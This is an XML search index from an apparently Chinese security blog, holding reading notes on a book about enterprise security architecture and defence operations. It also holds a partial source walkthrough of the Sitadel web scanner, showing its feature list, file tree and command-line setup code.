<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>《互联网企业安全高级指南》读书笔记</title>
      <link href="/archis/a7cdea15/"/>
      <url>/archis/a7cdea15/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>有幸拜读此书，来源iami师傅的读书笔记，本文结合师傅的笔记添加自己的一部分内容和思考。</p><h1 id="第一章-安全大环境与背景"><a href="#第一章-安全大环境与背景" class="headerlink" title="第一章 安全大环境与背景"></a>第一章 安全大环境与背景</h1><p>企业安全要关注的项目范畴似乎更加广义</p><ul><li>网络安全</li><li>平台和业务安全</li><li>信息安全</li><li>IT风险管理， IT审计&amp;内控</li><li>业务持续性管理BCM</li><li>安全品牌营销和渠道维护</li></ul><p>大型互联网企业安全建设的方法论<br>自研或对开源软件进行二次开发+无限水平扩展的软件架构+构建于普通中低端硬件之上（PC服务器甚至是白牌）+大数据机器学习的方式，是目前大型互联网公司用来应对业务持续性增长的主流安全解决方案。是否真的到了机器学习阶段这个有点难说，但是安全进入大数据时代则是肯定的。</p><h1 id="第二章-安全的组织"><a href="#第二章-安全的组织" class="headerlink" title="第二章 安全的组织"></a>第二章 安全的组织</h1><ul><li>极客型，创业型，中小型，大型等企业的安全水平必然不一样，而且即便在一个企业中，他的每一阶段的安全建设也是不一样的。</li><li>事前基线做好，新的服务器要确认安全，旧的逐步建立入侵检测系统。基础安全（10%的精力）做完之后投入一定的精力在业务安全，输出新的成果。领域要关注到反爬，账号等等，不同的行业关注的不一。其次要关注工具的自动化，和动作的自动化。</li></ul><h1 id="第三章-甲方安全建设方法论"><a href="#第三章-甲方安全建设方法论" class="headerlink" title="第三章 甲方安全建设方法论"></a>第三章 甲方安全建设方法论</h1><ul><li><p>不同阶段的安全建设重点</p><p>  ​    生产网络和办公网络的网络安全的基础部分</p><p>  ​    广义信息安全，业务安全</p><p>  ​    自研工具</p><p>  ​    对外开放</p></li><li><p>用“我们”去和其他部门沟通安全问题</p></li><li><p>管理的最初驱动是事件驱动和管理驱动。</p></li><li><p>针对以WEB产品为主的安全建设，一是事后修复的成本较低，二是部分的产品生命周期较短。</p></li><li><p>STRIDE威胁建模工具 </p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/image-20200211141414574-1583317174782.png" alt=""></p></li><li><p>应急响应有一个PDCERF模型</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20200211155245.png" alt=""></p></li></ul><p>TODO：</p><ul><li>需要了解的规范 ITIL(BS15000/ISO20000)</li><li>需要了解的规范 ISO27001</li><li>需要了解微软SDL</li><li>开拓视野，技术+标准系统</li><li>读《威胁建模》这本书</li></ul><p>CSO面临的问题： 如何推动安全策略？ 如何被认可，提高可信度？ 如何看待SDL？ 无法完全落地的原因是什么？</p><h1 id="第四章-业界的模糊地带"><a href="#第四章-业界的模糊地带" class="headerlink" title="第四章 业界的模糊地带"></a>第四章 业界的模糊地带</h1><ul><li>而在大型互联网下终端可能不直接告警，而是以采集数据为主，在每一个维度的安全解决方案上都会有自己的大数据环境，即单点的安全监测手段全部大数据化，通过第一次大数据计算在自己的纵向层次（例如主机入侵检测）上产生告警，而关联分析则会在利用第一次大数据计算结果的基础上提供第二次大数据计算产生更多的信息。是否在单维度上需要用到大数据计算环境，取决于IDC规模、数据量是否足够大，不大的情况下关系型数据库+黑白规则也可以胜任，而很大的时候往往需要用到大数据和机器学习。</li><li>OWASP的崛起在于，防火墙如同内衣一般起到了端口收拢和netfliter的作用。当一切收口至80，那么针对HTTP应用产生的攻击自然而然成为了防御的重点。其次也可以将WAF看做一个为七层流量清洗的NIDS设备。</li><li>当一个复杂生产网络的成千上万服务器分布在世界各地的IDC，资产附属也归不同的SA时。作为安全人员其实应该事先考虑到：逻辑架构与部署架构的差异点，以及当前架构下的资产由什么样的组织架构所属。</li></ul><h1 id="第五章-防御架构原则"><a href="#第五章-防御架构原则" class="headerlink" title="第五章 防御架构原则"></a>第五章 防御架构原则</h1><p>本章更多的讲述了安全架构上的一些原则性问题。</p><ul><li><p>攻防对抗主要是三个层面的对抗：信息对抗、技术对抗、运营能力对抗。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225195638.png" alt=""></p></li><li><p>互联网安全有几个比较核心的需求：快速检测、有限影响、快速溯源、快速恢复。通俗解释一遍就是：允许带着一些问题上线，但是有bug或入侵时安全人士能快速检测到而不是处于无知无觉的状态，就算发生了攻击或入侵，安全人士能做到使入侵者所获取的权限和造成的影响尽可能的小，并且安全人士有途径或快照还原入侵过程做根因分析，安全事件能在基本不影响业务的情况下恢复到健康状态。</p></li><li><p>纵深防御的前提应该是以业务层次划分域后，针对相同主机组具有同一安全级别的继续划分新的安全域。同时在数据库序列（可能业务无关）的层次划分新的安全域。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225202804.png" alt=""></p></li><li><p>互联网安全架构设计原则<br>  1.纵深防御</p><p>  2.多维防御</p><p>  3.降维防御</p><p>  4.实时入侵检测</p><p>  5.伸缩性、可水平扩展</p></li><li><p>在设计通过特定途径访问生产网机器的时候，在考虑网络划分的前提下仍需要考虑用户角色需要使用到的一些特殊工具。比如devops的可能拥有自动化部署工具，针对这些工具的访问方式做好怎么样的限制。</p></li><li><p>在威胁层层防护的过程，可以通过考虑同一风险项的不同层位置，以及不同层的不同风险。</p></li><li><p>对抗不仅仅在技术上，运营方面，情报获取方面等等</p></li><li><p>架构方案至少A,B，C三个以上，这样才能够提供有效的灾备。</p></li><li><p>安全域层面隔离基本上是业务上的，数据链路层隔离基本是网络上的，针对端口过滤即是网络层也是主机层的，属于更加具象化的东西。</p></li></ul><p>注意点：</p><ul><li>防御的伸缩性和水平扩展能力。当前云计算环境下，安全如何自适应服务的扩展。</li><li>检测的高性能，性能的低损耗。</li><li>业务的无感知，架构上降低耦合。（其实旁路和透明代理的模式，差不多这样）</li><li>成本要可控。大型互联网公司的海量IDC情况下怎么使得成本可控？</li><li>“信息孤岛”不可取，信息孤岛是个很严重的问题，极大的降低了劳动效率</li></ul><h1 id="第六章-基础安全措施"><a href="#第六章-基础安全措施" class="headerlink" title="第六章 基础安全措施"></a>第六章 基础安全措施</h1><p>本章主要讲述基础安全实操相关的一些技术点</p><ul><li>需要多端协同，迫使数据收拢和运行态收拢。比如说通过定制镜像杜绝一些内核开关，同时迫使特定方面的数据收敛至用户态。</li><li>网络上的基线，主机上的基线，ACL的基线，应用的基线（可写不可解析，可解析不可写），其他基础设施（LDAP，之外，重要的点应该是一个策略针对不同环境上的映射。baseline往往是管理策略。一切可变需要处于可控变化。</li><li>以白过滤黑。建立正常管理员和运维人员的行为profile，离线训练识别。</li></ul><p>TODO：</p><ul><li>搞一份安全基线的checklist （协同网络，安全组配置，系统配置，应用配置，ssh策略，账号密码策略等等，从多方位去降低，减缓攻击的过程）</li></ul><h1 id="第七章-网络安全"><a href="#第七章-网络安全" class="headerlink" title="第七章 网络安全"></a>第七章 网络安全</h1><p>本章主要讲述了企业安全中的网络安全部分</p><ul><li><p>HIDS（主机入侵检测系统）依旧有用 ,HIPS多了一个P多功能，比较典型的场景是在出口处部署NIDS，做统一流量监控，或者在此处部署NIPS。</p></li><li><p>什么时候D什么时候P要选择好，控制好自己可消耗的时延或者说可接受的时延。做出对应的检测和防护。无论是D还是P，二存一是必须的。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225220440.png" alt=""></p></li><li><p>WAF架构部署上有不同的方式，机房/CNAME/module部署/网络层部署/主机上等方式，混搭着来，视情况而定，同时针对规则的反馈补充应该做到行之有效。</p></li><li><p>如何建设T级的DDOS防御能力，从运营商的近源清洗到CDN的选择或自建。HTTP-DNS也不失为一种好的选择，但是各种措施之间即便都有部署，也要确定对应的调用接口的可用性。否则就会出现空有能力而无法使用的场景。（主要还是依靠运营商）</p><p>  1.网络层攻击：Syn-flood  ACK-flood  UDP-flood  ICMP-flood</p><p>  2.应用层攻击 ：CC    Dns-flood  慢速连接攻击  DOS攻击</p><p>  3.攻击方式  ： 混合型攻击     反射型攻击  流量放大型攻击  脉冲型攻击   链路泛洪型攻击</p></li><li><p>多层防御结构</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225221345.png" alt=""></p></li><li></li></ul><p>TODO：</p><ul><li>每种ddos攻击后常见的实现选项。例如反射型背后常见的易被放大的协议</li></ul><h1 id="第八章-入侵感知体系"><a href="#第八章-入侵感知体系" class="headerlink" title="第八章 入侵感知体系"></a>第八章 入侵感知体系</h1><p>本章讲述了入侵检测相关的一些架构和技术细节，包含但不限于HIDS和NIDS，RASP，数据库审计等。也就是说以上都被算作了入侵检测体系里的产品。</p><ul><li><p>企业应该根据业务特性适应性的调整入侵检测的重点，不应该针对全场景的覆盖。</p></li><li><p>文本检测webshell 观测同目录其他文件inode是个比较有意思的想法</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222502.png" alt=""></p></li><li><p>流量检测webshell</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222239.png" alt=""></p></li><li><p>发现攻击从web层到cgi层到系统层的调用趋势，即关注上下文事件</p></li><li><p>自研HIDS的架构设计中的一些细节性问题是之前没有考虑到的。同时根源设计的最初需要考虑适应企业自身的运维体系。从行业法规需求，基础安全需求，企业自身特殊安全风险需求以及网络环境自适应等。</p></li><li><p>控制管理的功能有时候需要具有自杀功能。一些功能要偃旗息鼓，从而降低利用率。</p></li><li><p>之前做的webshell是针对文本的检测，从业务特性中针对业务请求建立基线行为，以该方式针对特定业务检测。</p></li><li><p>架构部署上需要考虑到企业的服务规模。设备的所处位置是否能够起到作用。</p></li><li><p>基于Java RASP的攻击检测：基于高危行为组合的检测模型    基于调用栈的检测模型</p></li><li><p>AST解析依旧是个不错的方式</p></li><li><p>入侵检测数据分析平台</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200225222828.png" alt=""></p></li></ul><p>TODO:</p><ul><li><p>如何能够准确的发现一个函数变动带来的整个系统中其他附属影响的变动？比如sudo的提权会导致env字段变化之类的。怎么样制造这样的实验环境并发现对应的问题？</p></li><li><p>监控文件的手法，除inotify之外呢？</p></li><li><p>进程信息获取的技术方案手法？</p><blockquote><p>周期性遍历/proc 用户态Hook Libc函数 利用LSM模块接口 内核态Hook Libc函数</p></blockquote></li><li><p>哪些父进程权限较低但子进程权限较高的正常场景？</p></li><li><p>怎么样针对蠕虫和僵尸网络建立特定的检测策略？并具有一定的抑制能力。</p></li></ul><h1 id="第九章-漏洞扫描"><a href="#第九章-漏洞扫描" class="headerlink" title="第九章 漏洞扫描"></a>第九章 漏洞扫描</h1><p>本章主要讲述了漏洞扫描相关的知识，当然依旧提到了大数据在其中的应用。</p><ul><li><p>漏洞扫描、入侵感知和应急响应是技术维度日常工作中最重要的3个部分。</p></li><li><p>先做好端口扫描和高危端口的监控， ACL扫描每天都要做</p></li><li><p>弱口令扫描也不可大意，需要注意培训安全意识以及是否应用了默认的和简单的口令</p></li><li><p>在系统和应用的扫描上不一定完全依赖于网络扫描器</p></li><li><p>自动化Web安全检测平台</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226211104.png" alt=""></p></li><li><p>漏扫也可以用来补充资产库，在vpn服务器中会设置一个透明代理</p></li><li><p>被动式扫描器可以对处于灰色地带的资产进行防护。</p></li><li><p>减少漏扫的网络开销是件很重要的事情，同时也应该减少扫描任务。都是跟着轻重缓急来的。</p></li><li><p>在实践中，需要从以下几方面进行优化：<br>  1）不做全网的漏洞扫描，先做端口扫描，</p><p>  2）做好高危端口监控</p><p>  3）在系统和应用扫描上，不完全依赖于网络扫描器，可同时借助于本机agent扫描</p></li></ul><h1 id="第十章-移动应用安全"><a href="#第十章-移动应用安全" class="headerlink" title="第十章  移动应用安全"></a>第十章  移动应用安全</h1><ul><li>从整体业务角度来看，业务逻辑为皮，移动应用端的展示为毛。如何避免移动客户端做不应承担的判断，如何将应用安全和业务服务端逻辑进行划定是首先需要明确的。</li><li>以支付宝为例，限定数额以下的付款甚至不需要认证。这背后有很多需要背景数据收集，从第一次正常登录时设备本身的信息，包括用户日常操作行为收集的大数据等。在发现异常时，就会触发完整的认证过程了。当然在攻击者完全控制手机的情况，如果所有认证信息的要素都可以通过手机获取到，例如保存的认证信息，动态认证短信等，更多能够做到的也只有提高攻击的成本，而不能完全避免认证信息的盗用。</li></ul><h1 id="第十一章-代码审计"><a href="#第十一章-代码审计" class="headerlink" title="第十一章 代码审计"></a>第十一章 代码审计</h1><p>本章写的就更水了，只是介绍了一下开源的代码神奇工具。Coverity. 参考链接： <a href="https://scan.coverity.com" target="_blank" rel="external">https://scan.coverity.com</a></p><h1 id="第十二章-办公网络安全"><a href="#第十二章-办公网络安全" class="headerlink" title="第十二章 办公网络安全"></a>第十二章 办公网络安全</h1><p>本章主要讲述办公网相关</p><ul><li>安全网关中行为审计可以对员工上网行为做审计，可以抓内鬼和防止内部的某些安全问题。</li><li>针对特定的办公人员制定不停的安全策略，可以以此避免不同用户群的抵抗。研发给什么策略，运营给什么策略，市场给什么策略。</li><li>关注不同受众的团体特点，适应性的进行调整策略。比如说研发爱自由，运营不懂计算机。针对这些不同特点的群众，放不同的安全策略进行管控。</li><li>办公网需要明确自己防控的重点</li><li>beyondcorp不是指真的没有边界，Google也只是针对办公网做了这个。其背后依赖的是完整的鉴权体系，以及确切可控的终端。</li><li>APT既不能两手一摊不管，也不能钻牛角尖。治理APT一定要考虑ROI，或许部署蜜罐是个不错的选择。</li><li>不差钱就照着Gartner买买买</li><li>文化管理，终端管理（杀软，防泄密，远程访问），安全网关，研发管理。凑在一起</li><li>确实很多方案都是防君子不防小人。小人总有办法绕过。一定要技术管理两半搞，都要硬。</li></ul><h1 id="第十三章-安全管理体系"><a href="#第十三章-安全管理体系" class="headerlink" title="第十三章 安全管理体系"></a>第十三章 安全管理体系</h1><p>本章讲述的讲到了安全管理体系，项目管理方面</p><ul><li><p>安全管理体系图</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226212120.png" alt=""></p></li><li><p>大型安全部门组织结构图示例</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226212152.png" alt=""></p></li><li><p>安全的客户是什么？ 内部和外部两部分，一部分是对安全依赖的兄弟部门，另一部分外部看是2c还是2b，总之都是用户，也都是我们的客户。</p></li><li><p>KPI的设定参考IT平衡计分卡，安全团队的kpi衡量是 覆盖率，覆盖深度，检出率，TCO/ROI，技术维度指标。一句话就是拿数据来说话，别用空话衡量kpi。</p></li><li><p>内部评价指标和外部评价指标都要具备</p><blockquote><p>内部评价指标：覆盖率，覆盖深度（比如sql注入的检测，从代码扫描到waf防御，到db代理和db审计），检出率，主动止损率，TCO/ROI, 技术维度指标（在技术上的进步）</p></blockquote></li></ul><blockquote><p>外部评价指标： 攻防能力，视野和方法论，工程化能力，对业务的影响力</p></blockquote><ul><li>资产管理一定要做好，系统关联影响也是其中的一部分。</li><li>争取事情处于可控的最小集合，能够事前事中事后，均有布放。</li><li>职责矩阵要实现定义好。 RACI， Responsible， Accountable，Consulted， Informed。联系人，执行者，指挥人。要细看下这个职责矩阵。表13-3和图13-5</li><li>事前做好预案，临阵有人指挥，事情有条不紊，损失可最小化。</li><li>SRC要生态化，这个不仅是src，内部产品也要从平台化过渡到生态化。从全公司到全集团到全行业。</li></ul><h1 id="第十四章-隐私保护"><a href="#第十四章-隐私保护" class="headerlink" title="第十四章 隐私保护"></a>第十四章 隐私保护</h1><p>本章隐私保护相关</p><ul><li><p>访问控制（Identity&amp;Access Management，IAM）示意图：</p><p>  谁，对哪些资源，拥有，哪些权限，有效期是多长。</p></li><li><p>对于在线应用的后台数据存储而言，敏感数据（例如用户库、口令、密保、支付等）应考虑分表分库存储，应尽量减少一个上层应用出现漏洞时的影响</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213204.png" alt=""></p></li><li></li></ul><p>TODO</p><ul><li>文中提到的一些数据加密不了解，需要自己详细了解。</li><li>文件/磁盘加密</li></ul><h1 id="第十五章-业务安全与风控"><a href="#第十五章-业务安全与风控" class="headerlink" title="第十五章 业务安全与风控"></a>第十五章 业务安全与风控</h1><ul><li><p>永远的情报一知己知彼，百战不殆。</p></li><li><p>方法比技术更重要——上兵伐谋，最下攻城。技术的对抗是无止尽的，并且会不断地消耗内部的研发资源和IDC资源，改变战场规则可能起到一招退敌的效果。自己退一步可以让对方无计可施</p></li><li><p>数据比算法更重要——大数据的典型特征，算法可以不高大上，但是没有数据或数据太少，风控这件事也许你玩不起来。</p></li><li><p>纵深防御——纵深、多维度、降维防御在风控场景仍然适用，使用漏斗模型，由机器规则处理最原始的数据，逐步筛选过滤，由人工审核做最后一道防线。</p></li><li><p>账号安全</p><p>  1.注册，</p><p>  2.登录环节的问题包括：撞库、暴力破解、盗号登录、非常用设备登录、黑产小号和僵尸号登录等。</p><p>  3.账号风控架构示意图</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213648.png" alt=""></p></li><li><p>大型平台一般有很多应用，凭借一个登录token直接无障碍登录所有子应用在安全上并不是一个好的设计，一旦被XSS盗取token就相当于全线溃防。所以在功能和应用入口比较多的平台，会对业务划权重，分类分级，涉及个人认证信息、个人隐私、支付类的一般属于高级Web安全域，信息发布类的归入一般Web域</p></li></ul><h1 id="第十六章-大规模纵深防御体系设计与实现"><a href="#第十六章-大规模纵深防御体系设计与实现" class="headerlink" title="第十六章 大规模纵深防御体系设计与实现"></a>第十六章 大规模纵深防御体系设计与实现</h1><p>纵深防御的视角，提出了数据流视角，服务器视角，idc视角，逻辑攻防视角等方便考虑。 针对不同的IDC规模，业务类型做出适应性的定制。</p><ul><li><p>常见入侵感知数据源采集的维度 </p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226213822.png" alt=""></p></li><li><p>逻辑攻防视角</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/ backup/20200226214000.png" alt=""></p></li></ul><h1 id="第十七章-分阶段的安全体系建设"><a href="#第十七章-分阶段的安全体系建设" class="headerlink" title="第十七章 分阶段的安全体系建设"></a>第十七章 分阶段的安全体系建设</h1><p>基础的事情做了就能防御大部分的攻击。在防御初期投入80%的精力去做这些事情。</p><p>当具有一定基础之后，进入系统性的建设。各种产品维持出一个解决方案体系。可能有精力投入到自研之中。</p><p>最后全方位的开始关注SDL的事情。等等。都做好了可能才完成60-80分。</p><p>其后需要清理灰色地带，资产的遗漏，系统的遗漏，变革的bug，新增的ACL覆盖，弱口令等等。 </p><p>其次就是简历完善的应急响应能力，具有多方位的止血能力。从组织到流程到技术实施都能找到对应的负责人依照一定的流程采用相应的技术完成对应的操作。快字当先，一切都要快。发现快，响应快，完成快。 持续性的运营占用整个生命周期中80%以上的精力。</p><p>在整个安全团队存在的过程中持续运营起到了保障作用。当然运营也不仅仅是纯粹运营，也需要考虑技术深度的上的进步。单点的入侵检测到大规模的入侵检测，降低海量的告警（一大坨谁看呢）等等。完成风险的闭环才能完成可持续化的运营。</p>]]></content>
      
      
      <categories>
          
          <category> 读书摘要 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书摘要 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Read-Sitadel-Source</title>
      <link href="/archis/f4173bf8/"/>
      <url>/archis/f4173bf8/</url>
      
        <content type="html"><![CDATA[<h1 id="Sitadel源码阅读"><a href="#Sitadel源码阅读" class="headerlink" title="Sitadel源码阅读"></a>Sitadel源码阅读</h1><p>项目地址：<a href="https://github.com/shenril/Sitadel" target="_blank" rel="external">https://github.com/shenril/Sitadel</a></p><p>Web应用程序安全扫描程序</p><p>[TOC]</p><h2 id="0x00-功能介绍"><a href="#0x00-功能介绍" class="headerlink" title="0x00 功能介绍"></a>0x00 功能介绍</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190222153610.png" alt=""></p><h3 id="1-指纹识别"><a href="#1-指纹识别" class="headerlink" title="1. 指纹识别"></a>1. 指纹识别</h3><p>a)     服务器</p><p>b)     Web框架（CakePHP、CheeryPy……）</p><p>c)     前端框架（AngularJS、MeteorJS、VueJS……）</p><p>d)     Web应用程序防火墙（Waf）</p><p>e)     内容管理系统（CMS）</p><p>f)      操作系统（Linux、Unix……）</p><p>g)     编程语言（PHP、Ruby……）</p><p>h)     Cookie安全</p><p>i)      内容分发网络（CDN）</p><h3 id="2-攻击"><a href="#2-攻击" class="headerlink" title="2. 攻击"></a>2. 攻击</h3><p><strong>（1）暴力破解</strong></p><ul><li>管理接口</li><li>常用后门</li><li>常用备份目录</li><li>常用备份文件</li><li>常用目录</li><li>常用文件</li><li>日志文件</li></ul><p><strong>（2）注入攻击</strong></p><ul><li>HTML注入</li><li>SQL注入</li><li>LDAP注入</li><li>XPath注入</li><li>跨站脚本（XSS）</li><li>远程文件披露（RFI）</li><li>PHP代码注入</li></ul><p><strong>（3）其他攻击</strong></p><ul><li>HTTPAllow方法</li><li>HTML对象</li><li>多重引用</li><li>Robots路径</li><li>WebDav</li><li>跨站追踪（XST）</li><li>PHPINFO</li><li>Listing</li></ul><p><strong>（4）漏洞利用</strong></p><ul><li>ShellShock</li><li>匿名密码（CVE-2007-1858）</li><li>SPDY（CVE-2012-4929）</li><li>Struts-Shock</li></ul><h2 id="0x01-整体结构"><a href="#0x01-整体结构" class="headerlink" title="0x01 整体结构"></a>0x01 整体结构</h2><table><thead><tr><th>类型</th><th>名</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>config</td><td>配置</td></tr><tr><td>dir</td><td>lib</td><td>主要攻击文件，扩展，攻击用到的一些字典等等</td></tr><tr><td>dir</td><td>tests</td><td>测试文件</td></tr><tr><td>file</td><td>CHANGELOG</td><td>更新日志</td></tr><tr><td>file</td><td>Dockerfile</td><td>docker文件</td></tr><tr><td>file</td><td>LICENSE</td><td>许可证</td></tr><tr><td>file</td><td>Makefile</td><td>使用tests文件夹做测试</td></tr><tr><td>file</td><td>README.md</td><td>介绍</td></tr><tr><td>file</td><td>setup.py</td><td>安装文件</td></tr><tr><td>file</td><td>sitadel.py</td><td>主入口文件</td></tr></tbody></table><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/Sitadel扫描器.png" alt=""></p><p>所有文件</p><pre><code>├── CHANGELOG├── config│   └── config.yml├── Dockerfile├── lib│   ├── config│   │   ├── __init__.py│   │   └── settings.py│   ├── data│   │   ├── admin.txt│   │   ├── allowmethod.txt│   │   ├── backdoor.txt│   │   ├── bdir.txt│   │   ├── bfile.txt│   │   ├── cdir.txt│   │   ├── cfile.txt│   │   ├── index.txt│   │   ├── ldap.txt│   │   ├── log.txt│   │   ├── phpinfo.txt│   │   ├── rfi.txt│   │   ├── sql.txt│   │   ├── xpath.txt│   │   └── xss.txt│   ├── __init__.py│   ├── modules│   │   ├── attacks│   │   │   ├── bruteforce│   │   │   │   ├── admin.py│   │   │   │   ├── backdoor.py│   │   │   │   ├── bdir.py│   │   │   │   ├── bfile.py│   │   │   │   ├── dir.py│   │   │   │   ├── file.py│   │   │   │   ├── __init__.py│   │   │   │   └── log.py│   │   │   ├── __init__.py│   │   │   ├── injection│   │   │   │   ├── html.py│   │   │   │   ├── __init__.py│   │   │   │   ├── ldap.py│   │   │   │   ├── php.py│   │   │   │   ├── rfi.py│   │   │   │   ├── sql.py│   │   │   │   ├── xpath.py│   │   │   │   └── xss.py│   │   │   ├── other│   │   │   │   ├── allow_method.py│   │   │   │   ├── dav.py│   │   │   │   ├── htmlobject.py│   │   │   │   ├── __init__.py│   │   │   │   ├── listing.py│   │   │   │   ├── multipleindex.py│   │   │   │   ├── phpinfo.py│   │   │   │   ├── robots.py│   │   │   │   └── xst.py│   │   │   └── vulns│   │   │       ├── anonymous.py│   │   │       ├── crime.py│   │   │       ├── __init__.py│   │   │       ├── shellshock.py│   │   │       └── strutsshock.py│   │   ├── crawler│   │   │   ├── crawler.py│   │   │   └── __init__.py│   │   ├── fingerprints│   │   │   ├── cdn│   │   │   │   ├── akamai.py│   │   │   │   ├── azure.py│   │   │   │   ├── cloudflare.py│   │   │   │   ├── cloudfront.py│   │   │   │   ├── fastly.py│   │   │   │   └── __init__.py│   │   │   ├── cms│   │   │   │   ├── drupal.py│   │   │   │   ├── __init__.py│   │   │   │   ├── joomla.py│   │   │   │   ├── magento.py│   │   │   │   └── wordpress.py│   │   │   ├── framework│   │   │   │   ├── cakephp.py│   │   │   │   ├── cherrypy.py│   │   │   │   ├── dancer.py│   │   │   │   ├── django.py│   │   │   │   ├── flask.py│   │   │   │   ├── fuelphp.py│   │   │   │   ├── grails.py│   │   │   │   ├── __init__.py│   │   │   │   ├── laravel.py│   │   │   │   ├── mvc.py│   │   │   │   ├── nette.py│   │   │   │   ├── phalcon.py│   │   │   │   ├── rails.py│   │   │   │   ├── symfony.py│   │   │   │   ├── yii.py│   │   │   │   └── zend.py│   │   │   ├── frontend│   │   │   │   ├── angularjs.py│   │   │   │   ├── emberjs.py│   │   │   │   ├── __init__.py│   │   │   │   ├── jquery.py│   │   │   │   ├── knockout.py│   │   │   │   ├── meteorjs.py│   │   │   │   ├── mootools.py│   │   │   │   ├── prototype.py│   │   │   │   ├── reactjs.py│   │   │   │   └── vuejs.py│   │   │   ├── header│   │   │   │   ├── cookie.py│   │   │   │   ├── headers.py│   │   │   │   └── __init__.py│   │   │   ├── __init__.py│   │   │   ├── lang│   │   │   │   ├── asp.py│   │   │   │   ├── __init__.py│   │   │   │   ├── java.py│   │   │   │   ├── perl.py│   │   │   │   ├── php.py│   │   │   │   ├── python.py│   │   │   │   └── ruby.py│   │   │   ├── server│   │   │   │   ├── __init__.py│   │   │   │   └── server.py│   │   │   ├── system│   │   │   │   ├── bsd.py│   │   │   │   ├── __init__.py│   │   │   │   ├── linux.py│   │   │   │   ├── mac.py│   │   │   │   ├── solaris.py│   │   │   │   ├── unix.py│   │   │   │   └── windows.py│   │   │   └── waf│   │   │       ├── airlock.py│   │   │       ├── anquanboa.py│   │   │       ├── aws.py│   │   │       ├── baidu.py│   │   │       ├── barracuda.py│   │   │       ├── bigip.py│   │   │       ├── binarysec.py│   │   │       ├── blockdos.py│   │   │       ├── chinacache.py│   │   │       ├── ciscoacexml.py│   │   │       ├── cloudflare.py│   │   │       ├── cloudfront.py│   │   │       ├── dotdefender.py│   │   │       ├── edgecast.py│   │   │       ├── fortiweb.py│   │   │       ├── hyperguard.py│   │   │       ├── incapsula.py│   │   │       ├── __init__.py│   │   │       ├── isaserver.py│   │   │       ├── kona.py│   │   │       ├── modsecurity.py│   │   │       ├── netcontinuum.py│   │   │       ├── paloalto.py│   │   │       ├── profense.py│   │   │       ├── radware.py│   │   │       ├── requestvalidationmode.py│   │   │       ├── safedog.py│   │   │       ├── secureiis.py│   │   │       ├── sengnix.py│   │   │       ├── sitelock.py│   │   │       ├── sonicwall.py│   │   │       ├── sucuri.py│   │   │       ├── trafficshield.py│   │   │       ├── varnish.py│   │   │       ├── wallarm.py│   │   │       └── webknight.py│   │   └── __init__.py│   ├── request│   │   ├── __init__.py│   │   ├── ragent.py│   │   ├── requestfactory.py│   │   └── request.py│   └── utils│       ├── banner.py│       ├── container.py│       ├── datastore.py│       ├── __init__.py│       ├── manager.py│       ├── output.py│       └── validator.py├── LICENSE├── Makefile├── README.md├── setup.py├── sitadel.py└── tests    └── lib        ├── config        │   ├── good-config.yml        │   ├── __init__.py        │   ├── test_attack_config.yml        │   ├── test_config.py        │   └── test_fingerprint_config.yml        ├── modules        │   ├── attacks        │   │   ├── __init__.py        │   │   └── test_attack.py        │   ├── fingerprints        │   │   ├── __init__.py        │   │   └── test_fingerprint.py        │   └── __init__.py        ├── request        │   ├── __init__.py        │   ├── test_ragent.py        │   └── test_request.py        └── utils            ├── __init__.py            ├── test_container.py            └── test_manager.py31 directories, 180 files</code></pre><h2 id="0x02-入口文件"><a href="#0x02-入口文件" class="headerlink" title="0x02 入口文件"></a>0x02 入口文件</h2><p>sitadel.py：</p><p>主入口文件。会先初始化一些<code>Usage</code>，接受命令行参数并进行相关的前期处理。然后根据参数开始进行扫描。</p><pre><code class="python">if __name__ == &quot;__main__&quot;:    try:        Sitadel().main()    except KeyboardInterrupt:        sys.exit(output.Output().error(&#39;Interruption by the user, Quitting...&#39;))</code></pre><p>定义一个Sitadel类，通过parser.add_argument接受命令行参数</p><pre><code class="python">class Sitadel(object):    bn = banner.Banner()    ma = manager    url = None    def main(self):        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,                                         usage=self.bn.banner())        # 准备风险等级的可能值        risk_values = [r.value for r in Risk]        # 添加命令行参数：            #设定url选项字符串的名字url， help：参数的帮助信息        parser.add_argument(&quot;url&quot;, help=&quot;URL of the website to scan&quot;)            #设定危险等级选项字符串的名字-r或者-risk，参数可允许的值为risk_values        parser.add_argument(&quot;-r&quot;, &quot;--risk&quot;, type=int, help=&quot;Level of risk allowed for the scan&quot;,                            choices=risk_values)            #设定user-agent选项字符串的名字-ua，默认为&quot;Sitadel &quot; + 版本        parser.add_argument(&quot;-ua&quot;, &quot;--user-agent&quot;, default=&quot;Sitadel &quot; + __version__,                            help=&quot;User-agent to set for the scan requests&quot;)            #设定遵循重定向选项字符串的名字redirect  解析后的参数名称为redirect，命令行遇到参数时的动作为store_true        parser.add_argument(&quot;--redirect&quot;, 